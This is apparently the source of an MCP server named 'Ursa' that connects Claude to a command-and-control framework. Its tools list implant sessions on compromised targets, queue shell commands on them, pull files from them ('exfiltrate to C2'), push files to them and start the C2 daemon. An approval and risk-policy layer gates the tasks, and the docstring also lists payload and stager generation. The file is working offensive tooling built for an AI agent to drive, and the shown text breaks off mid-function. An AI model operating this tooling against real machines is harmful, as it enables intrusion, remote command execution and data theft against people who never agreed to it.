#!/usr/bin/env python3
"""
Ursa — C2 Operator MCP Server
================================
Claude's interface to the Ursa Major C2 framework.

Lets Claude manage sessions, issue tasks, track results, generate
payloads, and control the C2 — all from conversation.

Tools:
    Sessions:
        - ursa_sessions      — List all active/stale/dead sessions
        - ursa_session_info  — Get detailed info on a session
        - ursa_set_session_context — Set campaign/tags on a session
        - ursa_kill_session  — Kill a session

    Tasking:
        - ursa_shell         — Run a shell command on a target
        - ursa_task          — Send any task type to a session
        - ursa_task_result   — Check a task's result
        - ursa_tasks         — List tasks for a session

    Files:
        - ursa_download      — Download a file from a target
        - ursa_upload        — Upload a file to a target
        - ursa_files         — List exfiltrated files

    C2 Management:
        - ursa_start_c2      — Start the C2 server daemon
        - ursa_stop_c2       — Stop the C2 server
        - ursa_c2_status     — Check if C2 is running
        - ursa_events        — View C2 event log
        - ursa_approvals     — View pending/approved/rejected approvals
        - ursa_approve       — Approve one request
        - ursa_reject        — Reject one request
        - ursa_approve_campaign — Bulk-approve requests by campaign/tag
        - ursa_reject_campaign — Bulk-reject requests by campaign/tag

    Payload Generation:
        - ursa_generate      — Generate a beacon payload
        - ursa_stager        — Generate a stager one-liner

Run with:
    /path/to/ursa/venv/bin/python3 server.py
"""

import base64
import csv
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

# Add project root to path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

from major.db import (  # noqa: E402
    evaluate_campaign_policy_alerts,
    get_events,
    get_immutable_audit,
    get_session,
    get_task,
    kill_session,
    list_approval_requests,
    list_campaign_policies,
    list_files,
    list_sessions,
    list_tasks,
    update_session_info,
    upsert_campaign_policy,
    verify_immutable_audit_chain,
)
from major.governance import (  # noqa: E402
    format_risk_matrix,
    get_policy_remediation_plan,
    normalize_args_string,
    process_approval_decision,
    process_bulk_approval_decisions,
    queue_task_with_policy,
)

mcp_server = FastMCP(
    "ursa",
    instructions="""Ursa — Command & Control operator interface.
    You have tools to manage implant sessions, issue commands to compromised
    targets, track results, generate payloads, and control the C2 server.
    The C2 server (Ursa Major) must be running for session management to work.
    Use ursa_start_c2 to launch it if needed.""",
)

VENV_PYTHON = str(PROJECT_ROOT / "venv" / "bin" / "python3")
C2_PID_FILE = str(PROJECT_ROOT / "major" / ".c2.pid")


def _format_time(ts):
    """Format a Unix timestamp to human-readable."""
    if not ts:
        return "never"
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def _time_ago(ts):
    """Human-readable time since timestamp."""
    if not ts:
        return "never"
    diff = time.time() - ts
    if diff < 60:
        return f"{int(diff)}s ago"
    elif diff < 3600:
        return f"{int(diff/60)}m ago"
    elif diff < 86400:
        return f"{int(diff/3600)}h ago"
    else:
        return f"{int(diff/86400)}d ago"


# ── C2 Management ──


@mcp_server.tool()
def ursa_start_c2(port: int = 8443, host: str = "0.0.0.0") -> str:
    """
    Start the Ursa Major C2 server as a background daemon.

    Args:
        port: Port to listen on (default 8443)
        host: Bind address (default 0.0.0.0)
    """
    # Check if already running
    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)  # Check if process exists
            return f"Ursa Major is already running (PID {pid}) on port {port}"
        except (ProcessLookupError, ValueError):
            os.unlink(C2_PID_FILE)

    # Start C2 server
    proc = subprocess.Popen(
        [VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"), "--port", str(port), "--host", host],
        cwd=str(PROJECT_ROOT),
        stdout=open(str(PROJECT_ROOT / "major" / "c2.log"), "a"),
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    with open(C2_PID_FILE, "w") as f:
        f.write(str(proc.pid))

    time.sleep(1)

    if proc.poll() is None:
        return f"Ursa Major C2 started on {host}:{port} (PID {proc.pid})"
    else:
        return "Failed to start C2 server. Check major/c2.log for errors."


@mcp_server.tool()
def ursa_stop_c2() -> str:
    """Stop the Ursa Major C2 server."""
    if not os.path.exists(C2_PID_FILE):
        return "Ursa Major is not running (no PID file)"

    try:
        with open(C2_PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
        os.unlink(C2_PID_FILE)
        return f"Ursa Major stopped (PID {pid})"
    except ProcessLookupError:
        os.unlink(C2_PID_FILE)
        return "Ursa Major was not running (stale PID file removed)"
    except Exception as e:
        return f"Error stopping C2: {e}"


@mcp_server.tool()
def ursa_c2_status() -> str:
    """Check if the Ursa Major C2 server is running and show stats."""
    running = False
    pid = None

    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            running = True
        except (ProcessLookupError, ValueError):
            pass

    sessions = list_sessions()
    active = [s for s in sessions if s["status"] == "active"]
    stale = [s for s in sessions if s["status"] == "stale"]
    dead = [s for s in sessions if s["status"] == "dead"]

    lines = [
        "URSA MAJOR — STATUS",
        "=" * 40,
        f"Server:     {'RUNNING (PID ' + str(pid) + ')' if running else 'STOPPED'}",
        f"Sessions:   {len(active)} active, {len(stale)} stale, {len(dead)} dead",
        f"Total:      {len(sessions)}",
    ]

    if active:
        lines.append("")
        lines.append("Active Sessions:")
        for s in active:
            lines.append(f"  {s['id']}  {s['username']}@{s['hostname']}  "
                        f"({s['remote_ip']})  last: {_time_ago(s['last_seen'])}")

    return "\n".join(lines)


# ── Session Management ──


@mcp_server.tool()
def ursa_sessions(
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    List all implant sessions.

    Args:
        status: Filter by status — "active", "stale", or "dead".
        campaign: Filter by campaign name.
        tag: Filter by tag substring.
    """
    sessions = list_sessions(status=status, campaign=campaign, tag=tag)

    if not sessions:
        return f"No {'sessions' if not status else status + ' sessions'} found."

    lines = [
        f"{'ID':<10} {'User@Host':<26} {'Campaign':<14} {'Tags':<18} {'Last Seen':<12} {'Status'}",
        "-" * 110,
    ]

    for s in sessions:
        user_host = f"{s['username']}@{s['hostname']}"
        campaign_name = s.get("campaign") or "-"
        tags = s.get("tags") or "-"
        lines.append(
            f"{s['id']:<10} {user_host[:26]:<26} {campaign_name[:14]:<14} {tags[:18]:<18} "
            f"{_time_ago(s['last_seen']):<12} {s['status']}"
        )

    lines.append(f"\n{len(sessions)} sessions total")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_session_context(session_id: str, campaign: str = "", tags: str = "") -> str:
    """
    Set campaign and tags for a session to support grouping/organization.

    Args:
        session_id: Target session ID.
        campaign: Campaign/group name.
        tags: Comma-separated tags (e.g., "finance,dc1,high-value").
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    update_session_info(session_id, campaign=campaign.strip(), tags=tags.strip())
    return (
        f"Session {session_id} updated.\n"
        f"Campaign: {campaign.strip() or '-'}\n"
        f"Tags: {tags.strip() or '-'}"
    )


@mcp_server.tool()
def ursa_session_info(session_id: str) -> str:
    """
    Get detailed information about a specific session.

    Args:
        session_id: The session ID to look up
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    tasks = list_tasks(session_id=session_id, limit=10)
    files = list_files(session_id=session_id)

    lines = [
        f"SESSION: {s['id']}",
        "=" * 50,
        f"  Status:      {s['status']}",
        f"  Remote IP:   {s['remote_ip']}",
        f"  Hostname:    {s['hostname']}",
        f"  Username:    {s['username']}",
        f"  OS:          {s['os']}",
        f"  Arch:        {s['arch']}",
        f"  PID:         {s['pid']}",
        f"  Process:     {s['process_name']}",
        f"  Campaign:    {s.get('campaign') or '-'}",
        f"  Tags:        {s.get('tags') or '-'}",
        f"  First seen:  {_format_time(s['first_seen'])}",
        f"  Last seen:   {_format_time(s['last_seen'])} ({_time_ago(s['last_seen'])})",
        f"  Interval:    {s['beacon_interval']}s (jitter: {s['jitter']})",
        f"  Encrypted:   {'Yes' if s.get('encryption_key') else 'No'}",
    ]

    if tasks:
        lines.append(f"\n  Recent Tasks ({len(tasks)}):")
        for t in tasks:
            status_icon = {"completed": "✓", "error": "✗", "pending": "○", "in_progress": "◐"}.get(t["status"], "?")
            lines.append(f"    {status_icon} {t['id']}  {t['task_type']:<12}  {t['status']}")

    if files:
        lines.append(f"\n  Files ({len(files)}):")
        for f in files:
            lines.append(f"    {f['id']}  {f['filename']:<25}  {f['size']}B  {f['direction']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_kill_session(session_id: str) -> str:
    """
    Kill/deactivate a session.

    Args:
        session_id: The session ID to kill
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="kill",
        args={},
        actor="mcp:ursa_kill_session",
    )
    if decision["status"] == "approval_required":
        return (
            f"Kill action requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Use ursa_approve('{decision['approval_id']}') to proceed."
        )
    if decision["status"] != "queued":
        return f"Kill action denied: {decision['message']}"
    kill_session(session_id)
    return (
        f"Session {session_id} ({s['username']}@{s['hostname']}) killed.\n"
        f"Kill task queued: {decision['task_id']}"
    )


# ── Tasking ──


@mcp_server.tool()
def ursa_shell(session_id: str, command: str) -> str:
    """
    Execute a shell command on a target.

    The command is queued and will execute on the next beacon check-in.
    Use ursa_task_result to check the output.

    Args:
        session_id: Target session ID
        command: Shell command to execute
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot issue tasks."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="shell",
        args={"command": command},
        actor="mcp:ursa_shell",
    )
    if decision["status"] == "approval_required":
        return (
            f"Shell task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"{decision['message']}"
        )
    if decision["status"] != "queued":
        return f"Shell task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Shell task queued: {task_id}\n"
            f"Target: {s['username']}@{s['hostname']}\n"
            f"Command: {command}\n"
            f"Will execute on next beacon (interval: {s['beacon_interval']}s)")


@mcp_server.tool()
def ursa_task(session_id: str, task_type: str, args: str = "{}") -> str:
    """
    Send any task type to a session.

    Task types: shell, sysinfo, download, upload, sleep, kill, ps,
                pwd, cd, ls, whoami, env

    Args:
        session_id: Target session ID
        task_type: The task type to send
        args: JSON string of arguments (e.g., '{"command": "whoami"}')
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    try:
        task_args = normalize_args_string(args)
    except ValueError as exc:
        return str(exc)

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type=task_type,
        args=task_args,
        actor="mcp:ursa_task",
    )
    if decision["status"] == "approval_required":
        return (
            f"Task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}"
        )
    if decision["status"] != "queued":
        return f"Task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Task queued: {task_id}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}\n"
            f"Target: {s['username']}@{s['hostname']}")


@mcp_server.tool()
def ursa_task_result(task_id: str) -> str:
    """
    Check the result of a task.

    Args:
        task_id: The task ID to check
    """
    t = get_task(task_id)
    if not t:
        return f"Task {task_id} not found."

    lines = [
        f"TASK: {t['id']}",
        f"Type:      {t['task_type']}",
        f"Session:   {t['session_id']}",
        f"Status:    {t['status']}",
        f"Created:   {_format_time(t['created_at'])}",
    ]

    if t.get("picked_up_at"):
        lines.append(f"Picked up: {_format_time(t['picked_up_at'])}")
    if t.get("completed_at"):
        lines.append(f"Completed: {_format_time(t['completed_at'])}")

    if t["status"] == "pending":
        lines.append("\n(Waiting for implant to check in...)")
    elif t["status"] == "in_progress":
        lines.append("\n(Implant picked up task, waiting for result...)")
    elif t.get("result"):
        lines.append(f"\n--- Output ---\n{t['result']}")
    if t.get("error"):
        lines.append(f"\n--- Error ---\n{t['error']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_tasks(
    session_id: str | None = None,
    status: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
    limit: int = 20,
) -> str:
    """
    List tasks, optionally filtered by session and/or status.

    Args:
        session_id: Filter to a specific session
        status: Filter by status — "pending", "in_progress", "completed", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
        limit: Max tasks to return (default 20)
    """
    tasks = list_tasks(
        session_id=session_id,
        status=status,
        campaign=campaign,
        tag=tag,
        limit=limit,
    )

    if not tasks:
        return "No tasks found."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Campaign':<14} {'Type':<12} {'Status':<12} {'Created'}",
        "-" * 85,
    ]

    for t in tasks:
        lines.append(
            f"{t['id']:<10} {t['session_id']:<10} {(t.get('campaign') or '-')[:14]:<14} {t['task_type']:<12} "
            f"{t['status']:<12} {_time_ago(t['created_at'])}"
        )

    return "\n".join(lines)


# ── File Operations ──


@mcp_server.tool()
def ursa_download(session_id: str, remote_path: str) -> str:
    """
    Download a file from a target (exfiltrate to C2).

    Queues a download task. The file will be available via ursa_files
    once the implant checks in and sends it.

    Args:
        session_id: Target session ID
        remote_path: Path on the target to download
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="download",
        args={"path": remote_path},
        actor="mcp:ursa_download",
    )
    if decision["status"] == "approval_required":
        return (
            f"Download task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Download task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Download task queued: {task_id}\n"
            f"Target file: {remote_path}\n"
            f"Will transfer on next beacon check-in.")


@mcp_server.tool()
def ursa_upload(session_id: str, local_path: str, remote_path: str) -> str:
    """
    Upload a file to a target (deliver from C2).

    Args:
        session_id: Target session ID
        local_path: Local file path to upload
        remote_path: Destination path on the target
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    local_path_expanded = os.path.expanduser(local_path)
    if not os.path.exists(local_path_expanded):
        return f"Local file not found: {local_path}"

    with open(local_path_expanded, "rb") as f:
        data = f.read()

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="upload",
        args={"path": remote_path, "data": base64.b64encode(data).decode()},
        actor="mcp:ursa_upload",
    )
    if decision["status"] == "approval_required":
        return (
            f"Upload task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    if decision["status"] != "queued":
        return f"Upload task denied: {decision['message']}"
    task_id = decision["task_id"]
    return (f"Upload task queued: {task_id}\n"
            f"File: {local_path} ({len(data)} bytes) → {remote_path}")


@mcp_server.tool()
def ursa_files(session_id: str | None = None) -> str:
    """
    List files transferred to/from implants.

    Args:
        session_id: Filter to a specific session (optional)
    """
    files = list_files(session_id=session_id)

    if not files:
        return "No files stored."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Filename':<30} {'Size':<10} {'Dir':<10} {'Time'}",
        "-" * 85,
    ]

    for f in files:
        lines.append(
            f"{f['id']:<10} {f['session_id']:<10} {f['filename']:<30} "
            f"{f['size']:<10} {f['direction']:<10} {_time_ago(f['created_at'])}"
        )

    return "\n".join(lines)


# ── Events ──


@mcp_server.tool()
def ursa_events(
    limit: int = 30,
    level: str | None = None,
    campaign: str | None = None,
    tag: str | None = None,
) -> str:
    """
    View the C2 event log.

    Args:
        limit: Number of events to show (default 30)
        level: Filter by level — "info", "warning", "error"
        campaign: Filter by campaign name
        tag: Filter by tag substring
    """
    events = get_events(limit=limit, level=level, campaign=campaign, tag=tag)

    if not events:
        return "No events."

    lines = []
    for e in events:
        ts = datetime.fromtimestamp(e["timestamp"]).strftime("%H:%M:%S")
        sid = f" [{e['session_id']}]" if e.get("session_id") else ""
        camp = f" ({e['campaign']})" if e.get("campaign") else ""
        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}{camp}: {e['message']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaigns() -> str:
    """Summarize session/task/event activity by campaign."""
    sessions = list_sessions()
    tasks = list_tasks(limit=1000)
    events = get_events(limit=1000)

    campaigns: dict[str, dict[str, int]] = {}
    for s in sessions:
        name = (s.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["sessions"] += 1
    for t in tasks:
        name = (t.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["tasks"] += 1
    for e in events:
        name = (e.get("campaign") or "unassigned").strip() or "unassigned"
        campaigns.setdefault(name, {"sessions": 0, "tasks": 0, "events": 0})
        campaigns[name]["events"] += 1

    if not campaigns:
        return "No campaign activity found."

    lines = [
        f"{'Campaign':<20} {'Sessions':<10} {'Tasks':<10} {'Events'}",
        "-" * 56,
    ]
    for name, counts in sorted(campaigns.items(), key=lambda item: item[0]):
        lines.append(
            f"{name[:20]:<20} {counts['sessions']:<10} {counts['tasks']:<10} {counts['events']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_report(campaign: str, output_format: str = "json") -> str:
    """
    Export a campaign report to disk.

    Args:
        campaign: Campaign name to export.
        output_format: "json" or "csv".
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=5000)
    events = get_events(campaign=campaign_name, limit=5000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    safe_name = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in campaign_name)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        report = {
            "campaign": campaign_name,
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "sessions": len(sessions),
                "tasks": len(tasks),
                "events": len(events),
            },
            "sessions": sessions,
            "tasks": tasks,
            "events": events,
        }
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
    else:
        out_path = reports_dir / f"campaign_{safe_name}_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "id", "session_id", "type", "status_or_level", "message"])
            for s in sessions:
                writer.writerow(["session", s["id"], s["id"], "session", s.get("status", ""), s.get("hostname", "")])
            for t in tasks:
                writer.writerow(["task", t["id"], t.get("session_id", ""), t.get("task_type", ""), t.get("status", ""), ""])
            for e in events:
                writer.writerow(["event", e["id"], e.get("session_id", ""), e.get("source", ""), e.get("level", ""), e.get("message", "")])

    return (
        f"Campaign report exported.\n"
        f"Campaign: {campaign_name}\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}"
    )


@mcp_server.tool()
def ursa_campaign_info(campaign: str) -> str:
    """
    Show detailed operational context for a campaign.

    Args:
        campaign: Campaign name.
    """
    campaign_name = campaign.strip()
    if not campaign_name:
        return "Campaign is required."
    sessions = list_sessions(campaign=campaign_name)
    tasks = list_tasks(campaign=campaign_name, limit=200)
    events = get_events(campaign=campaign_name, limit=200)
    approvals = list_approval_requests(status="pending", campaign=campaign_name, limit=200)
    if not sessions and not tasks and not events and not approvals:
        return f"No activity found for campaign '{campaign_name}'."

    by_status: dict[str, int] = {}
    by_task_type: dict[str, int] = {}
    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for s in sessions:
        status = s.get("status", "unknown")
        by_status[status] = by_status.get(status, 0) + 1
    for t in tasks:
        ttype = t.get("task_type", "unknown")
        by_task_type[ttype] = by_task_type.get(ttype, 0) + 1
    for a in approvals:
        risk = (a.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1

    lines = [
        f"CAMPAIGN: {campaign_name}",
        "=" * 50,
        f"Sessions:          {len(sessions)}",
        f"Tasks (recent):    {len(tasks)}",
        f"Events (recent):   {len(events)}",
        f"Pending approvals: {len(approvals)}",
        "",
        "Session Status:",
    ]
    for key, count in sorted(by_status.items(), key=lambda item: item[0]):
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Task Types:",
        ]
    )
    for key, count in sorted(by_task_type.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {key}: {count}")

    lines.extend(
        [
            "",
            "Pending Approval Risk:",
            f"  critical: {by_risk['critical']}",
            f"  high:     {by_risk['high']}",
            f"  medium:   {by_risk['medium']}",
            f"  low:      {by_risk['low']}",
        ]
    )
    if sessions:
        lines.append("")
        lines.append("Recent Sessions:")
        for s in sessions[:10]:
            lines.append(
                f"  {s['id']} {s['username']}@{s['hostname']} "
                f"({s['remote_ip']}) {s['status']}"
            )
    return "\n".join(lines)


# ── Governance ──


@mcp_server.tool()
def ursa_policy_matrix() -> str:
    """Show the Ursa unified policy/risk matrix."""
    return "URSA POLICY MATRIX\n==================\n" + format_risk_matrix()


@mcp_server.tool()
def ursa_governance_summary(
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
) -> str:
    """
    Summarize pending approvals by risk and campaign.

    Args:
        campaign: Optional campaign filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
    """
    rows = list_approval_requests(
        status="pending",
        campaign=(campaign or "").strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=1000,
    )
    if not rows:
        return "No pending approvals."

    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    by_campaign: dict[str, int] = {}
    for row in rows:
        risk = (row.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1
        name = (row.get("campaign") or "unassigned").strip() or "unassigned"
        by_campaign[name] = by_campaign.get(name, 0) + 1

    lines = [
        "PENDING APPROVAL SUMMARY",
        "=" * 40,
        f"Total: {len(rows)}",
        "",
        "By Risk:",
        f"  critical: {by_risk['critical']}",
        f"  high:     {by_risk['high']}",
        f"  medium:   {by_risk['medium']}",
        f"  low:      {by_risk['low']}",
        "",
        "By Campaign:",
    ]
    for name, count in sorted(by_campaign.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {name}: {count}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_campaign_policy(
    campaign: str,
    max_pending_total: int = 20,
    max_pending_high: int = 10,
    max_pending_critical: int = 2,
    note: str = "",
) -> str:
    """
    Create/update a campaign governance threshold policy.

    Args:
        campaign: Campaign name.
        max_pending_total: Max pending approvals before alert.
        max_pending_high: Max pending high-risk approvals before alert.
        max_pending_critical: Max pending critical approvals before alert.
        note: Optional policy note.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    policy = upsert_campaign_policy(
        campaign=name,
        max_pending_total=max_pending_total,
        max_pending_high=max_pending_high,
        max_pending_critical=max_pending_critical,
        updated_by="mcp:ursa_set_campaign_policy",
        note=note,
    )
    return (
        f"Policy updated for {name}.\n"
        f"max_pending_total={policy['max_pending_total']}\n"
        f"max_pending_high={policy['max_pending_high']}\n"
        f"max_pending_critical={policy['max_pending_critical']}"
    )


@mcp_server.tool()
def ursa_campaign_policies() -> str:
    """List configured campaign governance policies."""
    rows = list_campaign_policies()
    if not rows:
        return "No campaign policies configured."
    lines = [
        f"{'Campaign':<20} {'Total':<8} {'High':<8} {'Critical':<8} {'Updated By'}",
        "-" * 70,
    ]
    for row in rows:
        lines.append(
            f"{row['campaign'][:20]:<20} {row['max_pending_total']:<8} "
            f"{row['max_pending_high']:<8} {row['max_pending_critical']:<8} {row['updated_by']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_alerts(campaign: str | None = None) -> str:
    """
    Show active policy alerts for campaign thresholds.

    Args:
        campaign: Optional campaign filter.
    """
    alerts = evaluate_campaign_policy_alerts(campaign=(campaign or "").strip() or None)
    if not alerts:
        return "No active campaign policy alerts."
    lines = [
        f"{'Campaign':<20} {'Metric':<10} {'Value':<8} {'Threshold':<10} {'Severity'}",
        "-" * 70,
    ]
    for alert in alerts:
        lines.append(
            f"{alert['campaign'][:20]:<20} {alert['metric']:<10} {alert['value']:<8} "
            f"{alert['threshold']:<10} {alert['severity']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_policy_remediation_plan(campaign: str | None = None) -> str:
    """
    Generate remediation recommendations for active campaign policy alerts.

    Args:
        campaign: Optional campaign filter.
    """
    plan = get_policy_remediation_plan(campaign=(campaign or "").strip() or None)
    if not plan:
        return "No active alerts to remediate."
    lines = [
        "POLICY REMEDIATION PLAN",
        "=" * 40,
    ]
    for item in plan[:20]:
        lines.extend(
            [
                f"- Campaign: {item['campaign']}  Metric: {item['metric']}  Severity: {item['severity']}",
                f"  Action: {item['action']}",
                f"  Approve: {item['approve_cmd']}",
                f"  Reject:  {item['reject_cmd']}",
            ]
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_apply_policy_remediation(
    campaign: str,
    strategy: str = "reduce-critical",
    note: str = "",
) -> str:
    """
    Apply a conservative bulk remediation strategy for one campaign.

    Strategies:
      - reduce-critical: reject pending critical approvals
      - reduce-high: reject pending high approvals
      - clear-backlog: reject all pending approvals
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."

    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_apply_policy_remediation",
        note=note or f"Auto-remediation strategy={strategy_key}",
        campaign=name,
        risk_level=risk_level,
        limit=500,
    )
    return (
        f"Remediation applied.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}"
    )


@mcp_server.tool()
def ursa_preview_policy_remediation(campaign: str, strategy: str = "reduce-critical") -> str:
    """
    Preview how many approvals would be affected by a remediation strategy.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    rows = list_approval_requests(
        status="pending",
        campaign=name,
        risk_level=risk_level,
        limit=5000,
    )
    return (
        f"Remediation preview.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Would affect: {len(rows)} pending approvals"
    )


@mcp_server.tool()
def ursa_governance_report(output_format: str = "json") -> str:
    """
    Export governance snapshot report (policies, alerts, pending approvals).
    """
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    policies = list_campaign_policies()
    alerts = evaluate_campaign_policy_alerts()
    approvals = list_approval_requests(status="pending", limit=5000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        payload = {
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "policies": len(policies),
                "alerts": len(alerts),
                "pending_approvals": len(approvals),
            },
            "policies": policies,
            "alerts": alerts,
            "pending_approvals": approvals,
        }
        out_path = reports_dir / f"governance_snapshot_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
    else:
        out_path = reports_dir / f"governance_snapshot_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "campaign", "metric", "value", "extra"])
            for p in policies:
                writer.writerow(
                    [
                        "policy",
                        p["campaign"],
                        "thresholds",
                        f"total={p['max_pending_total']} high={p['max_pending_high']} critical={p['max_pending_critical']}",
                        p.get("note", ""),
                    ]
                )
            for a in alerts:
                writer.writerow(
                    [
                        "alert",
                        a["campaign"],
                        a["metric"],
                        a["value"],
                        f"threshold={a['threshold']} severity={a['severity']}",
                    ]
                )
            for p in approvals:
                writer.writerow(
                    [
                        "pending_approval",
                        p.get("campaign") or "unassigned",
                        p.get("risk_level", ""),
                        p.get("id", ""),
                        p.get("reason", ""),
                    ]
                )

    return (
        f"Governance report exported.\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}\n"
        f"Policies: {len(policies)} Alerts: {len(alerts)} Pending approvals: {len(approvals)}"
    )


@mcp_server.tool()
def ursa_approvals(
    status: str = "pending",
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
    limit: int = 20,
) -> str:
    """
    List governance step-up approval requests.

    Args:
        status: Filter by status ("pending", "approved", "rejected")
        campaign: Filter by campaign name
        tag: Filter by tag substring
        risk_level: Filter by risk level
        limit: Max rows to return
    """
    rows = list_approval_requests(
        status=status,
        campaign=campaign,
        tag=tag,
        risk_level=risk_level,
        limit=limit,
    )
    if not rows:
        return f"No {status} approvals."

    lines = [
        f"{'ID':<10} {'Risk':<10} {'Campaign':<14} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
        "-" * 100,
    ]
    for row in rows:
        lines.append(
            f"{row['id']:<10} {row['risk_level']:<10} {(row.get('campaign') or '-')[:14]:<14} {row['action']:<12} "
            f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
            f"{_time_ago(row['created_at'])}"
        )
